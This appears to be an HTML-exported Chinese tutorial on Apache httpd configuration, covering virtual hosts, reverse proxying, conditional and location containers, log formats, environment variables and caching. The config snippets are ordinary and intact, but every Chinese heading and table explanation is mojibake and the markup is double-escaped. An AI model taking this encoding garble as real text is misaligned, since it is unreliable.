webmaster@host.example.com  DocumentRoot "/www/docs/host.example.com"  ServerName host.example.com  ServerAlias server server2.example.com server2  ServerAlias *.example.com  UseCanonicalName Off  ErrorLog "logs/host.example.com-error_log"  TransferLog "logs/host.example.com-access_log"&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>VirtualHost</code></td><td>åŒ…å«ä¸€ç»„ä»…é€‚ç”¨äºç‰¹å®šè™šæ‹Ÿä¸»æœºçš„æŒ‡ä»¤</td></tr><tr><td><code>ServerAlias</code></td><td>ä¸ºä¸»æœºååˆ›å»ºä¸€ä¸ªåˆ«å</td></tr><tr><td><code>ProxyPreserveHost On     </code></td><td>ä½¿ç”¨ä¼ å…¥çš„ä¸»æœº HTTP è¯·æ±‚æ ‡å¤´è¿›è¡Œä»£ç†è¯·æ±‚</td></tr><tr><td><code> ProxyPass "/" "http://192.168.111.2/"</code></td><td>å°†è¿œç¨‹æœåŠ¡å™¨æ˜ å°„åˆ°æœ¬åœ°æœåŠ¡å™¨ URL ç©ºé—´</td></tr><tr><td><code>ProxyPassReverse "/" "http://192.168.111.2/"</code></td><td>è°ƒæ•´ä»åå‘ä»£ç†æœåŠ¡å™¨å‘é€çš„ HTTP å“åº”æ ‡å¤´ä¸­çš„ URL</td></tr><tr><td><code>ServerPath</code></td><td>ç”±ä¸å…¼å®¹çš„æµè§ˆå™¨è®¿é—®çš„åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœºçš„æ—§ URL è·¯å¾„å</td></tr><tr><td><code>RewriteRule</code></td><td>å®šä¹‰é‡å†™å¼•æ“çš„è§„åˆ™</td></tr><tr><td>â€¦.</td><td></td></tr></tbody></table><h4 id="åœ¨å•ä¸ª-IP-åœ°å€ä¸Šè¿è¡Œå¤šä¸ªåŸºäºåç§°çš„ç½‘ç«™"><a href="#åœ¨å•ä¸ª-IP-åœ°å€ä¸Šè¿è¡Œå¤šä¸ªåŸºäºåç§°çš„ç½‘ç«™" class="headerlink" title="åœ¨å•ä¸ª IP åœ°å€ä¸Šè¿è¡Œå¤šä¸ªåŸºäºåç§°çš„ç½‘ç«™"></a>åœ¨å•ä¸ª IP åœ°å€ä¸Šè¿è¡Œå¤šä¸ªåŸºäºåç§°çš„ç½‘ç«™</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config"># Ensure that Apache listens on port 80Listen 80&amp;ltVirtualHost *:80&gt;    DocumentRoot "/www/example1"    ServerName www.example.com    # Other directives here&amp;lt/VirtualHost&gt;&amp;ltVirtualHost *:80&gt;    DocumentRoot "/www/example2"    ServerName www.example.org    # Other directives here&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å¤šä¸ª-IP-åœ°å€ä¸Šçš„åŸºäºåç§°çš„ä¸»æœº"><a href="#å¤šä¸ª-IP-åœ°å€ä¸Šçš„åŸºäºåç§°çš„ä¸»æœº" class="headerlink" title="å¤šä¸ª IP åœ°å€ä¸Šçš„åŸºäºåç§°çš„ä¸»æœº"></a>å¤šä¸ª IP åœ°å€ä¸Šçš„åŸºäºåç§°çš„ä¸»æœº</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80# This is the "main" server running on 172.20.30.40ServerName server.example.comDocumentRoot "/www/mainserver"&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example1"    ServerName www.example.com    # Other directives here ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example2"    ServerName www.example.org    # Other directives here ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åœ¨ä¸åŒçš„-IP-åœ°å€ï¼ˆä¾‹å¦‚å†…éƒ¨å’Œå¤–éƒ¨åœ°å€ï¼‰ä¸Šæä¾›ç›¸åŒçš„å†…å®¹"><a href="#åœ¨ä¸åŒçš„-IP-åœ°å€ï¼ˆä¾‹å¦‚å†…éƒ¨å’Œå¤–éƒ¨åœ°å€ï¼‰ä¸Šæä¾›ç›¸åŒçš„å†…å®¹" class="headerlink" title="åœ¨ä¸åŒçš„ IP åœ°å€ï¼ˆä¾‹å¦‚å†…éƒ¨å’Œå¤–éƒ¨åœ°å€ï¼‰ä¸Šæä¾›ç›¸åŒçš„å†…å®¹"></a>åœ¨ä¸åŒçš„ IP åœ°å€ï¼ˆä¾‹å¦‚å†…éƒ¨å’Œå¤–éƒ¨åœ°å€ï¼‰ä¸Šæä¾›ç›¸åŒçš„å†…å®¹</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost 192.168.1.1 172.20.30.40&gt;    DocumentRoot "/www/server1"    ServerName server.example.com    ServerAlias server&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åœ¨ä¸åŒçš„ç«¯å£ä¸Šè¿è¡Œä¸åŒçš„ç«™ç‚¹"><a href="#åœ¨ä¸åŒçš„ç«¯å£ä¸Šè¿è¡Œä¸åŒçš„ç«™ç‚¹" class="headerlink" title="åœ¨ä¸åŒçš„ç«¯å£ä¸Šè¿è¡Œä¸åŒçš„ç«™ç‚¹"></a>åœ¨ä¸åŒçš„ç«¯å£ä¸Šè¿è¡Œä¸åŒçš„ç«™ç‚¹</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80Listen 8080&amp;ltVirtualHost 172.20.30.40:80&gt;    ServerName www.example.com    DocumentRoot "/www/domain-80"&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:8080&gt;    ServerName www.example.com    DocumentRoot "/www/domain-8080"&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:80&gt;    ServerName www.example.org    DocumentRoot "/www/otherdomain-80"&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:8080&gt;    ServerName www.example.org    DocumentRoot "/www/otherdomain-8080"&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åŸºäºIPçš„è™šæ‹Ÿä¸»æœº"><a href="#åŸºäºIPçš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºIPçš„è™šæ‹Ÿä¸»æœº"></a>åŸºäºIPçš„è™šæ‹Ÿä¸»æœº</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example1"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example2"    ServerName www.example.org&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åŸºäºç«¯å£å’ŒåŸºäº-ip-çš„æ··åˆè™šæ‹Ÿä¸»æœº"><a href="#åŸºäºç«¯å£å’ŒåŸºäº-ip-çš„æ··åˆè™šæ‹Ÿä¸»æœº" class="headerlink" title="åŸºäºç«¯å£å’ŒåŸºäº ip çš„æ··åˆè™šæ‹Ÿä¸»æœº"></a>åŸºäºç«¯å£å’ŒåŸºäº ip çš„æ··åˆè™šæ‹Ÿä¸»æœº</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 172.20.30.40:80Listen 172.20.30.40:8080Listen 172.20.30.50:80Listen 172.20.30.50:8080&amp;ltVirtualHost 172.20.30.40:80&gt;    DocumentRoot "/www/example1-80"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:8080&gt;    DocumentRoot "/www/example1-8080"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50:80&gt;    DocumentRoot "/www/example2-80"    ServerName www.example.org&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50:8080&gt;    DocumentRoot "/www/example2-8080"    ServerName www.example.org&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ··åˆåŸºäºåç§°å’ŒåŸºäº-IP-çš„è™šæ‹Ÿä¸»æœº"><a href="#æ··åˆåŸºäºåç§°å’ŒåŸºäº-IP-çš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="æ··åˆåŸºäºåç§°å’ŒåŸºäº IP çš„è™šæ‹Ÿä¸»æœº"></a>æ··åˆåŸºäºåç§°å’ŒåŸºäº IP çš„è™šæ‹Ÿä¸»æœº</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example1"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example2"    ServerName www.example.org&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example3"    ServerName www.example.net&amp;lt/VirtualHost&gt;# IP-based&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example4"    ServerName www.example.edu&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.60&gt;    DocumentRoot "/www/example5"    ServerName www.example.gov&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä¸€èµ·ä½¿ç”¨-Virtual-host-å’Œ-mod-proxy"><a href="#ä¸€èµ·ä½¿ç”¨-Virtual-host-å’Œ-mod-proxy" class="headerlink" title="ä¸€èµ·ä½¿ç”¨ Virtual_host å’Œ mod_proxy"></a>ä¸€èµ·ä½¿ç”¨ Virtual_host å’Œ mod_proxy</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost *:*&gt;    ProxyPreserveHost On    ProxyPass        "/" "http://192.168.111.2/"    ProxyPassReverse "/" "http://192.168.111.2/"    ServerName hostname.example.com&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä½¿ç”¨-default-vhosts"><a href="#ä½¿ç”¨-default-vhosts" class="headerlink" title="ä½¿ç”¨_default_vhosts"></a>ä½¿ç”¨<code>_default_</code>vhosts</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost _default_:80&gt;    DocumentRoot "/www/default80"    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost _default_:*&gt;    DocumentRoot "/www/default"    # ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å°†åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœºè¿ç§»åˆ°åŸºäº-IP-çš„è™šæ‹Ÿä¸»æœº"><a href="#å°†åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœºè¿ç§»åˆ°åŸºäº-IP-çš„è™šæ‹Ÿä¸»æœº" class="headerlink" title="å°†åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœºè¿ç§»åˆ°åŸºäº IP çš„è™šæ‹Ÿä¸»æœº"></a>å°†åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœºè¿ç§»åˆ°åŸºäº IP çš„è™šæ‹Ÿä¸»æœº</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80ServerName www.example.comDocumentRoot "/www/example1"&amp;ltVirtualHost 172.20.30.40 172.20.30.50&gt;    DocumentRoot "/www/example2"    ServerName www.example.org    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example3"    ServerName www.example.net    ServerAlias *.example.net    # ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ä½¿ç”¨-ServerPath-æŒ‡ä»¤"><a href="#ä½¿ç”¨-ServerPath-æŒ‡ä»¤" class="headerlink" title="ä½¿ç”¨ ServerPath æŒ‡ä»¤"></a>ä½¿ç”¨ ServerPath æŒ‡ä»¤</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost 172.20.30.40&gt;    # primary vhost    DocumentRoot "/www/subdomain"    RewriteEngine On    RewriteRule "." "/www/subdomain/index.html"    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/subdomain/sub1"    ServerName www.sub1.domain.tld    ServerPath "/sub1/"    RewriteEngine On    RewriteRule "^(/sub1/.*)" "/www/subdomain$1"    # ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/subdomain/sub2"    ServerName www.sub2.domain.tld    ServerPath "/sub2/"    RewriteEngine On    RewriteRule "^(/sub2/.*)" "/www/subdomain$1"    # ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ¡ä»¶åˆ¤æ–­å®¹å™¨"><a href="#æ¡ä»¶åˆ¤æ–­å®¹å™¨" class="headerlink" title="æ¡ä»¶åˆ¤æ–­å®¹å™¨"></a>æ¡ä»¶åˆ¤æ–­å®¹å™¨</h3><h4 id="If"><a href="#If" class="headerlink" title="If"></a>If</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIf "!(%{HTTP_REFERER} -strmatch 'http://www.example.com/*')"&gt;    Require all denied&amp;lt/If&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>If</code></td><td>æ¡ä»¶æ»¡è¶³åˆ™æ‰§è¡Œå†…éƒ¨è¯­å¥</td></tr><tr><td><code>!(%{HTTP_REFERER} -strmatch 'http://www.example.com/*')</code></td><td>æ¡ä»¶</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h4 id="IfDefine"><a href="#IfDefine" class="headerlink" title="IfDefine"></a>IfDefine</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIfDefine ClosedForNow&gt;    Redirect / http://otherserver.example.com/&amp;lt/IfDefine&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>IfDefine</code></td><td>è‹¥ä½¿ç”¨<code>httpd -D ClosedForNow</code>æŒ‡ä»¤æ‰§è¡Œçš„æ“ä½œå°±ä¼šæ‰§è¡Œé‡Œé¢çš„å†…å®¹ï¼ˆå¯é•¶åµŒï¼‰</td></tr><tr><td><code>ClosedForNow</code></td><td>ä½¿ç”¨<code>httpd -D ClosedForNow</code>æŒ‡ä»¤æ‰§è¡Œï¼Œå‰é¢åŠ ï¼è¡¨ç¤ºç›¸å</td></tr><tr><td><code>Redirect</code></td><td>è·³è½¬åˆ°å¦ä¸€ç«™ç‚¹</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h4 id="IfModule"><a href="#IfModule" class="headerlink" title="IfModule"></a>IfModule</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIfModule mod_mime_magic.c&gt;    MimeMagicFile conf/magic&amp;lt/IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>IfModule</code></td><td>è‹¥ä½¿ç”¨äº†<code>mod_mime_magic</code>æ¨¡å—å°±æ‰§è¡Œé‡Œé¢å†…å®¹ï¼ˆå¯é•¶åµŒï¼‰</td></tr><tr><td><code>mod_mime_magic.c</code></td><td>æ¨¡å—å</td></tr><tr><td><code>MimeMagicFile</code></td><td>æ‰§è¡Œçš„æŒ‡ä»¤</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h4 id="IfVersion"><a href="#IfVersion" class="headerlink" title="IfVersion"></a>IfVersion</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltIfVersion &gt;= 2.1&gt;    # this happens only in versions greater or    # equal 2.1.0.&amp;lt/IfVersion&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>IfVersion</code></td><td>ç‰ˆæœ¬æ»¡è¶³å°±ä¼šæ‰§è¡Œ</td></tr><tr><td>â€¦.</td><td></td></tr></tbody></table><h3 id="ç½‘ç«™ç©ºé—´å®¹å™¨"><a href="#ç½‘ç«™ç©ºé—´å®¹å™¨" class="headerlink" title="ç½‘ç«™ç©ºé—´å®¹å™¨"></a>ç½‘ç«™ç©ºé—´å®¹å™¨</h3><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltLocation "/status"&gt;  SetHandler server-status  Require host example.com&amp;lt/Location&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>Location</code></td><td>Location å®¹å™¨å†…å®šä¹‰çš„æŒ‡ä»¤ä»…å¯¹ç‰¹å®šçš„ URL æœ‰æ•ˆ</td></tr><tr><td><code>/status</code></td><td>å°†ç‰¹å®šURLæ˜ å°„åˆ°<code>mod_status</code>æä¾›çš„å†…éƒ¨<code>Apache HTTP Server</code>å¤„ç†ç¨‹åº</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="Proxyå®¹å™¨"><a href="#Proxyå®¹å™¨" class="headerlink" title="Proxyå®¹å™¨"></a>Proxyå®¹å™¨</h3><h4 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxy "http://example.com/foo/*"&gt;  SetOutputFilter INCLUDES&amp;lt/Proxy&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="æ›´çµæ´»çš„åŒ¹é…å®¹å™¨"><a href="#æ›´çµæ´»çš„åŒ¹é…å®¹å™¨" class="headerlink" title="æ›´çµæ´»çš„åŒ¹é…å®¹å™¨"></a>æ›´çµæ´»çš„åŒ¹é…å®¹å™¨</h3><h4 id="DirectoryMatch"><a href="#DirectoryMatch" class="headerlink" title="DirectoryMatch"></a>DirectoryMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectoryMatch "^/www/(.+/)?[0-9]{3}/"&gt;    # ...&amp;lt/DirectoryMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="FilesMatch"><a href="#FilesMatch" class="headerlink" title="FilesMatch"></a>FilesMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltFilesMatch ".+\.(gif|jpe?g|png)$"&gt;    # ...&amp;lt/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="LocationMatch"><a href="#LocationMatch" class="headerlink" title="LocationMatch"></a>LocationMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltLocationMatch "^/combined/(?&amp;ltsitename&gt;[^/]+)"&gt;    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example&amp;lt/LocationMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ProxyMatch"><a href="#ProxyMatch" class="headerlink" title="ProxyMatch"></a>ProxyMatch</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltProxyMatch "^http://(?&amp;ltsitename&gt;[^/]+)"&gt;    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example&amp;lt/ProxyMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="æ—¥å¿—æ¨¡å—"><a href="#æ—¥å¿—æ¨¡å—" class="headerlink" title="æ—¥å¿—æ¨¡å—"></a>æ—¥å¿—æ¨¡å—</h3><h4 id="é€šç”¨æ—¥å¿—æ ¼å¼"><a href="#é€šç”¨æ—¥å¿—æ ¼å¼" class="headerlink" title="é€šç”¨æ—¥å¿—æ ¼å¼"></a>é€šç”¨æ—¥å¿—æ ¼å¼</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">LogFormat "%h %l %u %t \"%r\" %&gt;s %b" commonCustomLog logs/access_log.log common<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="ç»„åˆæ—¥å¿—æ ¼å¼"><a href="#ç»„åˆæ—¥å¿—æ ¼å¼" class="headerlink" title="ç»„åˆæ—¥å¿—æ ¼å¼"></a>ç»„åˆæ—¥å¿—æ ¼å¼</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-agent}i\"" combinedCustomLog log/access_log.log combined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>%h</code>æ˜¯è¿œç¨‹ä¸»æœº</li><li><code>%l</code>æ˜¯ç”±identdç¡®å®šçš„ç”¨æˆ·çš„èº«ä»½</li><li><code>%u</code>æ˜¯HTTPèº«ä»½éªŒè¯ç¡®å®šçš„ç”¨æˆ·å</li><li><code>%t</code>æ˜¯æœåŠ¡å™¨å¤„ç†å®Œè¯·æ±‚çš„æ—¶é—´</li><li><code>%r</code>æ˜¯æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚è¡ŒGETã€HTTP</li><li><code>%&gt; s</code>æ˜¯ä»æœåŠ¡å™¨å‘é€åˆ°å®¢æˆ·ç«¯çš„çŠ¶æ€ä»£ç </li><li><code>%b</code>æ˜¯å®¢æˆ·ç«¯å“åº”çš„å¤§å°(ä»¥å­—èŠ‚ä¸ºå•ä½)</li><li><code>"%{Referer}i</code>æ˜¯é“¾æ¥åˆ°æ­¤URLçš„é¡µé¢</li><li><code>%{User-Agent}i</code> æ˜¯å®¢æˆ·æµè§ˆå™¨æä¾›çš„æµè§ˆå™¨è¯†åˆ«ä¿¡æ¯</li></ul><pre class="line-numbers language-config" data-language="config"><code class="language-config">LogFormat "%400,501{User-agent}i" browserlogLogFormat "%!200,304,302{Referer}i" refererlog#å‰é¢çš„çŠ¶æ€ç æ˜¯ç”¨æ¥åˆ¤æ–­çš„<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>ErrorLog</code> â€œxxxâ€</td><td>å®šä½æœåŠ¡å™¨é”™è¯¯æ—¥å¿—çš„ä½ç½®ï¼Œé»˜è®¤ä½¿ç”¨ç›¸å¯¹è·¯å¾„</td></tr><tr><td><code>LogLevel warn</code></td><td>æ—¥å¿—çº§åˆ«</td></tr><tr><td><code>ErrorLogFormat</code></td><td>è®¾ç½®é”™è¯¯æ—¥å¿—çš„æ ¼å¼</td></tr><tr><td><code>CustomLog logs/access_log common</code></td><td>åˆ›å»ºå’Œæ ¼å¼åŒ–æ—¥å¿—æ–‡ä»¶<code>common</code></td></tr><tr><td><code>LogFormat "%h %l %u %t "%r" %&gt;s %b "%{Referer}i" "%{User-agent}i"" common</code></td><td><code>common</code>ä¸ºç”¨æˆ·æ—¥å¿—åˆ«åï¼Œä¸­é—´ä¸ºå…·ä½“æ ¼å¼</td></tr><tr><td><code>TransferLog "logs/host.example.com-access_log"</code></td><td>åˆ›å»ºæ—¥å¿—æ–‡ä»¶</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h2 id="é™„åŠ çš„é…ç½®æ–‡ä»¶"><a href="#é™„åŠ çš„é…ç½®æ–‡ä»¶" class="headerlink" title="é™„åŠ çš„é…ç½®æ–‡ä»¶"></a>é™„åŠ çš„é…ç½®æ–‡ä»¶</h2><h3 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h3><h4 id="è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®ç¯å¢ƒå˜é‡"></a>è®¾ç½®ç¯å¢ƒå˜é‡</h4><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>unique_id_module</code></td><td>ä¸ºæ¯ä¸ªè¯·æ±‚æä¾›ä¸€ä¸ªå…·æœ‰å”¯ä¸€æ ‡è¯†ç¬¦çš„ç¯å¢ƒå˜é‡</td></tr><tr><td><code>PassEnv LD_LIBRARY_PATH</code></td><td>ä» shell ä¼ é€’ç¯å¢ƒå˜é‡</td></tr><tr><td><code>SetEnv SPECIAL_PATH /foo/bin</code></td><td>è®¾ç½®ç¯å¢ƒå˜é‡</td></tr><tr><td><code>UnsetEnv LD_LIBRARY_PATH</code></td><td>ä»ç¯å¢ƒä¸­åˆ é™¤å˜é‡</td></tr><tr><td><code>SetEnvIf Request_URI "\.(.*)$" EXTENSION=$1</code></td><td>æ ¹æ®è¯·æ±‚çš„å±æ€§è®¾ç½®ç¯å¢ƒå˜é‡</td></tr><tr><td><code>SetEnvIfExpr expr [!]env-variable[=value] [[!]env-variable[=value]] ...</code></td><td></td></tr><tr><td><code>BrowserMatch Robot is_a_robot </code>&amp;ltbr&gt;<code>SetEnvIf User-Agent Robot is_a_robot</code></td><td>ä»¥ HTTP ç”¨æˆ·ä»£ç†ä¸ºæ¡ä»¶è®¾ç½®ç¯å¢ƒå˜é‡</td></tr><tr><td><code>SetEnvIfNoCase</code></td><td>æ ¹æ®è¯·æ±‚çš„å±æ€§è®¾ç½®ç¯å¢ƒå˜é‡è€Œä¸è€ƒè™‘å¤§å°å†™</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h4 id="ä½¿ç”¨ç¯å¢ƒå˜é‡"><a href="#ä½¿ç”¨ç¯å¢ƒå˜é‡" class="headerlink" title="ä½¿ç”¨ç¯å¢ƒå˜é‡"></a>ä½¿ç”¨ç¯å¢ƒå˜é‡</h4><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>Require all granted</code></td><td></td></tr><tr><td><code>CustomLog</code></td><td>è®¾ç½®æ—¥å¿—æ–‡ä»¶çš„æ–‡ä»¶åå’Œæ ¼å¼</td></tr><tr><td><code>Allow</code></td><td>æ§åˆ¶å“ªäº›ä¸»æœºå¯ä»¥è®¿é—®æœåŠ¡å™¨çš„æŸä¸ªåŒºåŸŸ</td></tr><tr><td><code>Deny</code></td><td>æ§åˆ¶å“ªäº›ä¸»æœºè¢«æ‹’ç»è®¿é—®æœåŠ¡å™¨</td></tr><tr><td><code>ExtFilterDefine</code></td><td>å®šä¹‰å¤–éƒ¨è¿‡æ»¤å™¨</td></tr><tr><td>`Header [condition] add</td><td>append</td></tr><tr><td><code>Header set Content-Type "text/plain" "expr=-z %{CONTENT_TYPE}"</code></td><td></td></tr><tr><td><code>RewriteCond TestString CondPattern [flags]</code></td><td>å®šä¹‰é‡å†™å‘ç”Ÿçš„æ¡ä»¶</td></tr><tr><td><code>RewriteRule Pattern Substitution [flags]</code></td><td>å®šä¹‰é‡å†™å¼•æ“çš„è§„åˆ™</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="ç¼“å­˜æŒ‡å—"><a href="#ç¼“å­˜æŒ‡å—" class="headerlink" title="ç¼“å­˜æŒ‡å—"></a>ç¼“å­˜æŒ‡å—</h3><pre class="line-numbers language-config" data-language="config"><code class="language-config">Sample httpd.conf## Sample Cache Configuration#LoadModule cache_module modules/mod_cache.so&amp;ltIfModule mod_cache.c&gt;    LoadModule cache_disk_module modules/mod_cache_disk.so    &amp;ltIfModule mod_cache_disk.c&gt;        CacheRoot "c:/cacheroot"        CacheEnable disk  "/"        CacheDirLevels 5        CacheDirLength 3    &amp;lt/IfModule&gt;    # When acting as a proxy, don't cache the list of security updates    CacheDisable "http://security.update.server/update-list/"&amp;lt/IfModule&gt;<span aria-hidden="true" 